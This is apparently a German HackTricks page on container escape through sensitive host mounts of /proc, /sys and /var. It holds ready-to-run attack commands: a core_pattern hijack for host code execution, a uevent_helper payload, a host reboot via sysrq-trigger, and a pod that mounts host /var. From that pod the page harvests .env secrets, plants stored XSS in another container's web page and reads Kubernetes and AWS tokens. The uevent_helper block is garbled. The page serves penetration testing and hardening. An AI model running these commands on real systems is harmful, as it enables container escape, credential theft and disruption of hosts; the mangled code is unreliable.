# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

Die Exposition von `/proc`, `/sys` und `/var` ohne angemessene Namensraum-Isolierung führt zu erheblichen Sicherheitsrisiken, einschließlich einer Vergrößerung der Angriffsfläche und Informationsoffenlegung. Diese Verzeichnisse enthalten sensible Dateien, die, wenn sie falsch konfiguriert oder von einem unbefugten Benutzer zugegriffen werden, zu einem Container-Ausbruch, Host-Modifikation oder zur Bereitstellung von Informationen führen können, die weitere Angriffe unterstützen. Zum Beispiel kann das falsche Einhängen von `-v /proc:/host/proc` den AppArmor-Schutz aufgrund seiner pfadbasierenden Natur umgehen und `/host/proc` ungeschützt lassen.

**Weitere Details zu jeder potenziellen Schwachstelle finden Sie unter** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Schwachstellen

### `/proc/sys`

Dieses Verzeichnis erlaubt den Zugriff zur Modifikation von Kernel-Variablen, normalerweise über `sysctl(2)`, und enthält mehrere besorgniserregende Unterverzeichnisse:

#### **`/proc/sys/kernel/core_pattern`**

- Beschrieben in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Ermöglicht die Definition eines Programms, das bei der Erzeugung von Kernelspeicherabbildern ausgeführt wird, wobei die ersten 128 Bytes als Argumente verwendet werden. Dies kann zu einer Codeausführung führen, wenn die Datei mit einer Pipe `|` beginnt.
- **Test- und Ausbeutungsbeispiel**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test auf Schreibzugriff
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Benutzerdefinierten Handler festlegen
sleep 5 && ./crash & # Handler auslösen
```

#### **`/proc/sys/kernel/modprobe`**

- Detailliert in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Enthält den Pfad zum Kernel-Modul-Lader, der zum Laden von Kernel-Modulen aufgerufen wird.
- **Zugriffsprüfung Beispiel**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Zugriff auf modprobe überprüfen
```

#### **`/proc/sys/vm/panic_on_oom`**

- Referenziert in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Ein globales Flag, das steuert, ob der Kernel bei einem OOM-Zustand einen Panic auslöst oder den OOM-Killer aufruft.

#### **`/proc/sys/fs`**

- Laut [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) enthält es Optionen und Informationen über das Dateisystem.
- Schreibzugriff kann verschiedene Denial-of-Service-Angriffe gegen den Host ermöglichen.

#### **`/proc/sys/fs/binfmt_misc`**

- Ermöglicht die Registrierung von Interpretern für nicht-native Binärformate basierend auf ihrer Magischen Zahl.
- Kann zu einer Privilegieneskalation oder Root-Shell-Zugriff führen, wenn `/proc/sys/fs/binfmt_misc/register` beschreibbar ist.
- Relevante Ausnutzung und Erklärung:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Ausführliches Tutorial: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Weitere in `/proc`

#### **`/proc/config.gz`**

- Kann die Kernel-Konfiguration offenbaren, wenn `CONFIG_IKCONFIG_PROC` aktiviert ist.
- Nützlich für Angreifer, um Schwachstellen im laufenden Kernel zu identifizieren.

#### **`/proc/sysrq-trigger`**

- Ermöglicht das Auslösen von Sysrq-Befehlen, was möglicherweise sofortige Systemneustarts oder andere kritische Aktionen verursacht.
- **Beispiel für Neustart des Hosts**:

```bash
echo b > /proc/sysrq-trigger # Neustart des Hosts
```

#### **`/proc/kmsg`**

- Gibt Nachrichten des Kernel-Ringpuffers aus.
- Kann bei Kernel-Ausnutzungen, Adresslecks helfen und sensible Systeminformationen bereitstellen.

#### **`/proc/kallsyms`**

- Listet vom Kernel exportierte Symbole und deren Adressen auf.
- Essentiell für die Entwicklung von Kernel-Ausnutzungen, insbesondere um KASLR zu überwinden.
- Adressinformationen sind eingeschränkt, wenn `kptr_restrict` auf `1` oder `2` gesetzt ist.
- Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Schnittstelle zum Kernel-Speichergerät `/dev/mem`.
- Historisch anfällig für Privilegieneskalationsangriffe.
- Mehr zu [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Stellt den physischen Speicher des Systems im ELF-Kernformat dar.
- Das Lesen kann Inhalte des Host-Systems und anderer Container offenbaren.
- Große Dateigröße kann zu Leseproblemen oder Softwareabstürzen führen.
- Ausführliche Nutzung in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Alternative Schnittstelle für `/dev/kmem`, die den virtuellen Speicher des Kernels darstellt.
- Ermöglicht das Lesen und Schreiben, somit die direkte Modifikation des Kernel-Speichers.

#### **`/proc/mem`**

- Alternative Schnittstelle für `/dev/mem`, die physischen Speicher darstellt.
- Ermöglicht das Lesen und Schreiben, die Modifikation des gesamten Speichers erfordert die Auflösung von virtuellen zu physischen Adressen.

#### **`/proc/sched_debug`**

- Gibt Informationen zur Prozessplanung zurück und umgeht die PID-Namensraum-Schutzmaßnahmen.
- Gibt Prozessnamen, IDs und cgroup-Identifikatoren preis.

#### **`/proc/[pid]/mountinfo`**

- Bietet Informationen über Einhängepunkte im Namensraum des Prozesses.
- Gibt den Standort des Container `rootfs` oder Images preis.

### `/sys` Schwachstellen

#### **`/sys/kernel/uevent_helper`**

- Wird zur Handhabung von Kernel-Gerät `uevents` verwendet.
- Das Schreiben in `/sys/kernel/uevent_helper` kann beliebige Skripte bei `uevent`-Auslösungen ausführen.
- **Beispiel für Ausnutzung**: %%%bash

#### Erstellt eine Payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Findet den Host-Pfad vom OverlayFS-Mount für den Container

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Setzt uevent_helper auf schädlichen Helper

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Löst ein uevent aus

echo change > /sys/class/mem/null/uevent

#### Liest die Ausgabe

cat /output %%%

#### **`/sys/class/thermal`**

- Steuert Temperatureinstellungen, was möglicherweise DoS-Angriffe oder physische Schäden verursachen kann.

#### **`/sys/kernel/vmcoreinfo`**

- Leckt Kernel-Adressen, was KASLR gefährden kann.

#### **`/sys/kernel/security`**

- Beherbergt die `securityfs`-Schnittstelle, die die Konfiguration von Linux-Sicherheitsmodulen wie AppArmor ermöglicht.
- Der Zugriff könnte es einem Container ermöglichen, sein MAC-System zu deaktivieren.

#### **`/sys/firmware/efi/vars` und `/sys/firmware/efi/efivars`**

- Gibt Schnittstellen für die Interaktion mit EFI-Variablen im NVRAM preis.
- Fehlkonfiguration oder Ausnutzung kann zu unbrauchbaren Laptops oder nicht bootfähigen Host-Maschinen führen.

#### **`/sys/kernel/debug`**

- `debugfs` bietet eine "keine Regeln"-Debugging-Schnittstelle zum Kernel.
- Geschichte von Sicherheitsproblemen aufgrund seiner uneingeschränkten Natur.

### `/var` Schwachstellen

Der **/var**-Ordner des Hosts enthält Container-Runtime-Sockets und die Dateisysteme der Container. Wenn dieser Ordner innerhalb eines Containers eingehängt wird, erhält dieser Container Lese- und Schreibzugriff auf die Dateisysteme anderer Container mit Root-Rechten. Dies kann missbraucht werden, um zwischen Containern zu pivotieren, um einen Denial of Service zu verursachen oder um andere Container und Anwendungen, die darin ausgeführt werden, zu hintertüren.

#### Kubernetes

Wenn ein Container wie dieser mit Kubernetes bereitgestellt wird:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
Innerhalb des **pod-mounts-var-folder** Containers:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
Die XSS wurde erreicht:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Beachten Sie, dass der Container keinen Neustart oder ähnliches benötigt. Alle Änderungen, die über den gemounteten **/var**-Ordner vorgenommen werden, werden sofort angewendet.

Sie können auch Konfigurationsdateien, Binärdateien, Dienste, Anwendungsdateien und Shell-Profile ersetzen, um automatisches (oder halbautomatisches) RCE zu erreichen.

##### Zugriff auf Cloud-Anmeldeinformationen

Der Container kann K8s-Servicekonto-Token oder AWS-Webidentitäts-Token lesen, was dem Container unbefugten Zugriff auf K8s oder die Cloud ermöglicht:
```bash
/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
#### Docker

Die Ausnutzung in Docker (oder in Docker Compose-Bereitstellungen) ist genau die gleiche, mit dem Unterschied, dass normalerweise die Dateisysteme der anderen Container unter einem anderen Basis-Pfad verfügbar sind:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
Die Dateisysteme befinden sich unter `/var/lib/docker/overlay2/`:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### Hinweis

Die tatsächlichen Pfade können in verschiedenen Setups abweichen, weshalb es am besten ist, den **find**-Befehl zu verwenden, um die Dateisysteme der anderen Container zu lokalisieren.

### Referenzen

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
